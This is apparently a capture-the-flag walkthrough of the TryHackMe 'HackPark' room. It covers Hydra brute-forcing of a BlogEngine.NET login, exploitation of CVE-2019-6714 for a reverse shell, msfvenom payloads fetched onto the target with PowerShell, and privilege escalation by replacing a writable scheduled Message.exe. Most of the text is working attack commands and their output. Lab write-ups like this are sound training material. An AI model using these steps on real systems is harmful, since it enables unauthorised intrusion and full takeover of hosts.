<p align="center">
  THM : HackPark<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/hackpark<br>
  <img src="https://i.imgur.com/6KDMd48.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Brute forcing the login page](#brute-forcing-the-login-page)
- [Exploiting BlogEngine.NET](#exploiting-blogenginenet)
- [Privilege escalation](#privilege-escalation)

## Nmap scan

Like always, let's start with an agressive [nmap](https://nmap.org/) scan to find open ports on the target :  
```
Nmap scan report for 10.10.35.201
Host is up (0.032s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2022-10-14T20:50:23+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.18 seconds
```

- We know it's a Windows machine
- There is a webserver running on this machine

## Website enumeration

Let's take a look at the main page of the website :  
![](https://i.imgur.com/FEOGCDX.jpg)  

It is asked to find the name of the clown on the homepage, so I just downloaded the image and 
I made a reverse image search to find the required information.

**Question : Whats the name of the clown displayed on the homepage ?**  
**Answer : Pennywise**  


When we open the menu at the top right of the page, we see there is a login page :  
![](https://i.imgur.com/pyqpPGG.jpg)  

Let's take a look at this login page :  
![](https://i.imgur.com/TkHuyHX.jpg)

We can try to bruteforce it. To do so, we need to find out what type of request is made by 
the login form and what is the name of each fields. We can use [Burp Suite](https://portswigger.net/burp) to do this. 
Let's make a request by entering a random username and a random password and 
capture it with [Burp Suite](https://portswigger.net/burp) :  
![](https://i.imgur.com/wmcPeIM.jpg)  

**Question : What request type is the Windows website login form using ?**  
**Answer : POST**  

## Brute forcing the login page

Now, we can use [Hydra](https://github.com/vanhauser-thc/thc-hydra) to try to brute-force this login page using admin as username :  
```
attacker@AttackBox:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.140.141 http-post-form "/Account/login.aspx:__VIEWSTATE=dkPjiL97ZxFNPe2fokQp2iLPTgxB87PbbvfNsixyp0sT1aOeKoJhwb3Q9a7AT1CZPpdxJ5r7fDw3m7yT1W6Hf%2BwRFxd%2FgMDcwGCitmvhYGxFCjA%2FzkUznOkXyVzqAZwkoZn%2Fk0H4pGRuDwlWTLLQBOsRI%2FENQLdmq4xcDtRTiNcLF9Z0&__EVENTVALIDATION=LJf7tcUSDLQkPLsKY50nU7lQmNvFtO4aStKyj3cqDAEp3pg%2B9fPOxQ9gXjFJw5WB9PZMNWWTWnQ7Jwwic0ayGaucd%2FrgRAd5QsMzgf5RxFM%2FGZKSLW9JWJRxewGnj30T8xfSjLtB%2FsFz8lYU6COI8LbeKrG%2BLRWNP%2BhFy6H3F8%2Bho9WP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Se+connecter:F=Failed"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-15 18:50:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking http-post-form://10.10.140.141:80/Account/login.aspx:__VIEWSTATE=dkPjiL97ZxFNPe2fokQp2iLPTgxB87PbbvfNsixyp0sT1aOeKoJhwb3Q9a7AT1CZPpdxJ5r7fDw3m7yT1W6Hf%2BwRFxd%2FgMDcwGCitmvhYGxFCjA%2FzkUznOkXyVzqAZwkoZn%2Fk0H4pGRuDwlWTLLQBOsRI%2FENQLdmq4xcDtRTiNcLF9Z0&__EVENTVALIDATION=LJf7tcUSDLQkPLsKY50nU7lQmNvFtO4aStKyj3cqDAEp3pg%2B9fPOxQ9gXjFJw5WB9PZMNWWTWnQ7Jwwic0ayGaucd%2FrgRAd5QsMzgf5RxFM%2FGZKSLW9JWJRxewGnj30T8xfSjLtB%2FsFz8lYU6COI8LbeKrG%2BLRWNP%2BhFy6H3F8%2Bho9WP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Se+connecter:F=Failed
[80][http-post-form] host: 10.10.140.141   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-15 18:51:20
```

**Question : Guess a username, choose a password wordlist and gain credentials to a user account !**  
**Answer : 1qaz2wsx**  

## Exploiting BlogEngine.NET

We successfuly brute-forced the login page ! Now let's use the crendentials we just found and see what other useful pages we 
can access on the website :  
![](https://i.imgur.com/INkmCz1.jpg)  

We have now access to the admin panel. Let's take a look at the "About" tab to see if we can 
find useful informations :  
![](https://i.imgur.com/XJWk03C.jpg)  

We now know that BlogEngine.NET 3.3.6.0 is installed on the website.  
**Question : Now you have logged into the website, are you able to identify the version of the BlogEngine ?**  
**Answer : 3.3.6.0**  

Now, we can search for BlogEngine 3.3.6 on [Exploit-DB](https://www.exploit-db.com/). We can see there is an exploit for BlogEngine.NET 3.3.6 that leads to a Remote Code Execution :  
![](https://i.imgur.com/GtkL9To.jpg)  

**Question : What is the CVE ?**  
**Answer : CVE-2019-6714**  

Before we use this exploit, we need to change the TcpClient address and port :  
![](https://i.imgur.com/d0SkFF0.jpg)  

We need to rename our malicious file to `PostView.ascx`, and then we can ulpoad the malicious file to the website.  
First we need to go to `/admin/app/editor/editpost.html` :  
![](https://i.imgur.com/mzFNq7L.jpg)

Then we can upload our malicious file by clicking on the `File Manager` button :  
![](https://i.imgur.com/02YsksD.jpg)

Now, we can set up a netcat listener on our local machine with `nc -lnvp 4242` and then navigate to `http://[TARGET_IP]/?theme=../../App_Data/files`:  
```
attacker@AttackBox:~/Documents/THM/CTF/HackPark$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.31.20] from (UNKNOWN) [10.10.140.141] 49314
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

And we have a reverse shell as `iis apppool\blog` !

**Question : Who is the webserver running as ?**  
**Answer : iis apppool\blog**

## Privilege escalation

### Summary

- [With Metasploit](#with-metasploit)
- [Without Metasploit](#without-metasploit)

### With metasploit

First, let's generate a meterpreter reverse shell using [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) :  
```
attacker@AttackBox:~/Documents/THM/CTF/HackPark$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4243 -f exe -o meterpreter.exe
[?] Would you like to init the webservice? (Not Required) [no]: 
[?] Would you like to delete your existing data and configurations? []: no
Clearing http web data service credentials in msfconsole
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/attacker/.msf4/db...success
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meterpreter.exe
```

Now, we can start a webserver using python and then download the malicious .exe file on the target. First, let's setup a temporary web server with `python3 -m http.server 80` :  
```
attacker@AttackBox:~/Documents/THM/CTF/HackPark$ sudo python3 -m http.server 80
[sudo] Mot de passe de attacker : 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now, let's download the payload to the target machine with powershell :  
```
powershell -c "wget 10.14.31.20/meterpreter.exe -outfile C:\inetpub\wwwroot\App_Data\files\meterpreter.exe"
c:\inetpub\wwwroot\App_Data\files>powershell -c "wget 10.14.31.20/meterpreter.exe -outfile C:\inetpub\wwwroot\App_Data\files\meterpreter.exe"
dir
c:\inetpub\wwwroot\App_Data\files>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\inetpub\wwwroot\App_Data\files
10/15/2022  10:53 AM    <DIR>          .
10/15/2022  10:53 AM    <DIR>          ..
08/04/2019  03:11 PM           103,419 26572c3a-0e51-4a9f-9049-b64e730ca75d.jpg
10/15/2022  10:53 AM            73,802 meterpreter.exe
10/15/2022  10:53 AM    <DIR>          Microsoft
10/15/2022  10:45 AM             3,504 PostView.ascx
               3 File(s)        180,725 bytes
               3 Dir(s)  39,124,463,616 bytes free
```

I downloaded the payload in `C:\inetpub\wwwroot\App_Data\files\` because I know I have write permissions in this directory. Now let's set up a listener using msfconsole on our local machine :  
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 4243
LPORT => 4243
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.14.31.20:4243
```

Now, let's execute the meterpreter.exe file via our unstable reverse shell :  
```
meterpreter.exe
c:\inetpub\wwwroot\App_Data\files>meterpreter.exe
```

If we go back to our metasploit listener :  
```
[*] Sending stage (175686 bytes) to 10.10.27.14
[*] Meterpreter session 1 opened (10.14.31.20:4243 -> 10.10.27.14:49226) at 2022-10-15 19:58:25 +0200

meterpreter >
```

We have a stable meterpreter shell. Now we can enumerate the machine :  
```
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

**Question : What is the OS version of this windows machine ?**  
**Answer : Windows 2012 R2 (6.3 Build 9600)**  

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > Get-Service

Status   Name               DisplayName
-Stopped  AeLookupSvc        Application Experience
...
...
Stopped  vmicrdv            Hyper-V Remote Desktop Virtualizati...
Stopped  vmicshutdown       Hyper-V Guest Shutdown Service
Stopped  vmictimesync       Hyper-V Time Synchronization Service
Stopped  vmicvss            Hyper-V Volume Shadow Copy Requestor
Stopped  VSS                Volume Shadow Copy
Running  W32Time            Windows Time
Stopped  w3logsvc           W3C Logging Service
Running  W3SVC              World Wide Web Publishing Service
Running  WAS                Windows Process Activation Service
Running  Wcmsvc             Windows Connection Manager
Stopped  WcsPlugInService   Windows Color System
Stopped  WdiServiceHost     Diagnostic Service Host
Stopped  WdiSystemHost      Diagnostic System Host
Stopped  Wecsvc             Windows Event Collector
Stopped  WEPHOSTSVC         Windows Encryption Provider Host Se...
Stopped  wercplsupport      Problem Reports and Solutions Contr...
Stopped  WerSvc             Windows Error Reporting Service
Running  WindowsScheduler   System Scheduler Service
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
...
...
```

**Question : What is the name of the abnormal service running ?**  
**Answer : WindowsScheduler**

```
PS > sc.exe qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

We see that there is a running service named WindowsScheduler. It means that there is maybe scheduled tasks running on that machine that we can try to use to escalate our privileges. 
If we go to `C:\Program Files (x86)\SystemScheduler\Events`, we can find a log file named `20198415519.INI_LOG.txt`. Let's take a look at it :  
```
PS > ls


    Directory: C:\Program Files (x86)\SystemScheduler\Events


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        10/15/2022  12:02 PM       1927 20198415519.INI
-a---        10/15/2022  12:02 PM      28309 20198415519.INI_LOG.txt
-a---         10/2/2020   2:50 PM        290 2020102145012.INI
-a---        10/15/2022  11:56 AM        186 Administrator.flg
-a---        10/15/2022  10:44 AM          0 Scheduler.flg
-a---        10/15/2022  11:56 AM          0 service.flg
-a---        10/15/2022  11:56 AM        449 SessionInfo.flg
-a---        10/15/2022  11:56 AM        182 SYSTEM_svc.flg


PS > cat 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
08/04/19 15:11:00,Event Started Ok, (Administrator)
08/04/19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)
08/04/19 15:12:00,Event Started Ok, (Administrator)
08/04/19 15:12:33,Process Ended. PID:2244,ExitCode:4,Message.exe (Administrator)
08/04/19 15:13:00,Event Started Ok, (Administrator)
08/04/19 15:13:33,Process Ended. PID:1700,ExitCode:4,Message.exe (Administrator)
08/04/19 16:43:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/04/19 16:44:01,Event Started Ok, (Administrator)
08/04/19 16:44:05,Process Ended. PID:2228,ExitCode:1,Message.exe (Administrator)
08/04/19 16:45:00,Event Started Ok, (Administrator)
08/04/19 16:45:20,Process Ended. PID:2640,ExitCode:1,Message.exe (Administrator)
08/04/19 16:46:00,Event Started Ok, (Administrator)
......
```

There is a file that keeps being executed periodically named "Message.exe". This file is present in the parent directory. Let's take a look at the permissions of this file :  
```
PS > Get-Acl Message.exe


    Directory: C:\Program Files (x86)\SystemScheduler


Path                                    Owner                                   Access
----                                    -----                                   ------
Message.exe                             BUILTIN\Administrators                  Everyone Allow  Modify, Synchronize...
```

We see that everyone can modify this file. Let's generate another meterpreter payload .exe file and replace Message.exe with it. I just generated the same payload as before with 
[msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) but I changed the listening port to 4244. Then I replaced Message.exe :  
```
PS > move Message.exe Message.exe.bak
PS > wget 10.14.31.20/Message.exe -outfile Message.exe
PS > ls


    Directory: C:\Program Files (x86)\SystemScheduler


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----        10/15/2022  12:12 PM            Events
-a---         5/17/2007   1:47 PM       1150 alarmclock.ico
-a---         8/31/2003  12:06 PM        766 clock.ico
-a---         8/31/2003  12:06 PM      80856 ding.wav
-a---          8/4/2019   4:36 AM         60 Forum.url
-a---          1/8/2009   7:21 PM    1637972 libeay32.dll
-a---        11/15/2004  11:16 PM       9813 License.txt
-a---        10/15/2022  10:43 AM       1496 LogFile.txt
-a---        10/15/2022  10:44 AM       3760 LogfileAdvanced.txt
-a---        10/15/2022  12:12 PM      73802 Message.exe
-a---         3/25/2018  10:58 AM     536992 Message.exe.bak
-a---         3/25/2018  10:59 AM     445344 PlaySound.exe
-a---         3/25/2018  10:58 AM      27040 PlayWAV.exe
-a---          8/4/2019   3:05 PM        149 Preferences.ini
-a---         3/25/2018  10:58 AM     485792 Privilege.exe
-a---         3/24/2018  12:09 PM      10100 ReadMe.txt
-a---         3/25/2018  10:58 AM     112544 RunNow.exe
-a---         3/25/2018  10:59 AM      40352 sc32.exe
-a---         8/31/2003  12:06 PM        766 schedule.ico
-a---         3/25/2018  10:58 AM    1633696 Scheduler.exe
-a---         3/25/2018  10:59 AM     491936 SendKeysHelper.exe
-a---         3/25/2018  10:58 AM     437664 ShowXY.exe
-a---         3/25/2018  10:58 AM     439712 ShutdownGUI.exe
-a---         3/25/2018  10:58 AM     235936 SSAdmin.exe
-a---         3/25/2018  10:58 AM     731552 SSCmd.exe
-a---          1/8/2009   7:12 PM     355446 ssleay32.dll
-a---         3/25/2018  10:58 AM     456608 SSMail.exe
-a---          8/4/2019   4:36 AM       6999 unins000.dat
-a---          8/4/2019   4:36 AM     722597 unins000.exe
-a---          8/4/2019   4:36 AM         54 Website.url
-a---         6/26/2009   5:27 PM       6574 whiteclock.ico
-a---         3/25/2018  10:58 AM      76704 WhoAmI.exe
-a---         5/16/2006   4:49 PM     785042 WSCHEDULER.CHM
-a---         5/16/2006   3:58 PM       2026 WScheduler.cnt
-a---         3/25/2018  10:58 AM     331168 WScheduler.exe
-a---         5/16/2006   4:58 PM     703081 WSCHEDULER.HLP
-a---         3/25/2018  10:58 AM     136096 WSCtrl.exe
-a---         3/25/2018  10:58 AM      98720 WService.exe
-a---         3/25/2018  10:58 AM      68512 WSLogon.exe
-a---         3/25/2018  10:59 AM      33184 WSProc.dll
```

Then I set up a new listener on port 4244 using the module multi/handler in [Metasploit](https://www.metasploit.com/) :  
```
msf6 exploit(multi/handler) > set LPORT 4244
LPORT => 4244
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.14.31.20:4244 
[*] Sending stage (175686 bytes) to 10.10.27.14
[*] Meterpreter session 6 opened (10.14.31.20:4244 -> 10.10.27.14:49316) at 2022-10-15 21:14:04 +0200

meterpreter > getuid
Server username: HACKPARK\Administrator
meterpreter >
```

We are Administrator of the machine !

**Question : What is the name of the binary you're supposed to exploit ?**  
**Answer : Message.exe**  

Let's get the flag on Jeff's desktop :  
```
meterpreter > ls
Listing: C:\Users\jeff\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-08-04 20:54:53 +0200  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 20:57:10 +0200  user.txt

meterpreter > cat user.txt
**************************************
```

**Question : What is the user flag (on Jeffs Desktop)?**  
**Answer : HIDDEN**  

And now the root flag since we are Administrator :  
```
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1029  fil   2019-08-04 13:36:42 +0200  System Scheduler.lnk
100666/rw-rw-rw-  282   fil   2019-08-03 19:43:54 +0200  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 20:51:42 +0200  root.txt

meterpreter > cat root.txt
**************************************
```

**Question : What is the root flag ?**  
**Answer : HIDDEN**  

### Without metasploit

Now, we will try to elescalate our privileges without [Metasploit](https://www.metasploit.com/). We will generate a more simple payload :  
```
attacker@AttackBox:~/Documents/THM/CTF/HackPark$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Let's download it using our netcat unstable shell like we did for the meterpreter shell before :  
```
c:\windows\system32\inetsrv>
powershell -c "wget 10.14.31.20/shell.exe -outfile C:\inetpub\wwwroot\App_Data\files\shell.exe      
c:\windows\system32\inetsrv>powershell -c "wget 10.14.31.20/shell.exe -outfile C:\inetpub\wwwroot\App_Data\files\shell.exe
```

Then, we can set up another netcat listener on port 4243 and then execute shell.exe :  
```
attacker@AttackBox:~/Documents/THM/CTF/HackPark$ nc -lnvp 4244
listening on [any] 4244 ...
connect to [10.14.31.20] from (UNKNOWN) [10.10.27.14] 49375
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\inetpub\wwwroot\App_Data\files>
```

Now, we can download [winPEAS.bat](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) on the target machine :  
```
c:\inetpub\wwwroot\App_Data\files>powershell -c "wget 10.14.31.20/winPEAS.bat -outfile C:\inetpub\wwwroot\App_Data\files\winPEAS.bat"    
powershell -c "wget 10.14.31.20/winPEAS.bat -outfile C:\inetpub\wwwroot\App_Data\files\winPEAS.bat"

c:\inetpub\wwwroot\App_Data\files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\inetpub\wwwroot\App_Data\files

10/15/2022  01:18 PM    <DIR>          .
10/15/2022  01:18 PM    <DIR>          ..
08/04/2019  03:11 PM           103,419 26572c3a-0e51-4a9f-9049-b64e730ca75d.jpg
10/15/2022  10:53 AM            73,802 meterpreter.exe
10/15/2022  10:53 AM    <DIR>          Microsoft
10/15/2022  10:45 AM             3,504 PostView.ascx
10/15/2022  12:37 PM            73,802 shell.exe
10/15/2022  01:18 PM            35,946 winPEAS.bat
               5 File(s)        290,473 bytes
               3 Dir(s)  39,042,953,216 bytes free
```

Let's run winPEAS.bat. It is asked to find the original install time :  
```
...
...
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          10/15/2022, 10:42:57 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
...
...
```

**Question : Using winPeas, what was the Original Install time ? (This is date and time)**  
**Answer : 8/3/2019, 10:43:23 AM**  

[WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) found some interesting informations :  
```
...
...
 [+] INSTALLED SOFTWARE
   [i] Some weird software? Check for vulnerabilities in unknow software installed
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software

Amazon
Common Files
Common Files
Internet Explorer
Internet Explorer
Microsoft.NET
SystemScheduler
Windows Mail
Windows Mail
Windows NT
Windows NT
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
...
...
...
taskhostex.exe                2528 N/A                                         
explorer.exe                  2604 N/A                                         
ServerManager.exe             3004 N/A                                         
WScheduler.exe                1308 N/A                                         
w3wp.exe                      1712 N/A                                         
msdtc.exe                      520 MSDTC                                       
cmd.exe                       2848 N/A                                         
conhost.exe                   1736 N/A   
...
...
```

Like we did earlier, [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) found a running process named WScheduler.exe and a 
software named SystemScheduler, from here, we can do the same as before :  
- Check the logs of SystemScheduler (C:\Program Files (x86)\SystemScheduler\Events)
- Find what binary is running periodically (Message.exe)
- Replace it with a reverse shell (not a meterpreter this time)
- Get the flags

## Conclusion

This room made me learn more how to enumerate windows hosts and how to elevate our privileges in a windows environment. Thanks for this room and for reading my write ups !
